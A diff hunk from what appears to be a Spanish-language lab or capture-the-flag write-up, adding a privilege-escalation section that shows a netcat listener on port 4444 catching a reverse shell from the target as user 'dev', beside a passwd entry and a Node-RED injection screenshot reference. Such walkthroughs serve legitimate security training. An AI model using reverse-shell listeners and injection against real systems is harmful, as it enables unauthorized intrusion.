@@ -349,6 +349,15 @@ dfinkelstein:x:1002:1002:,,,:/home/dfinkelstein:/bin/bash
 
 
 ## Escalada de privilegios
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.128.160] from (UNKNOWN) [10.128.154.75] 46936
+bash: no se puede establecer el grupo de proceso de terminal (337): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+dev@tnightmarebc:~$ ls -la
+```
 
 ![](Evidencias_Visuales/inyección_NODE-RED)
 
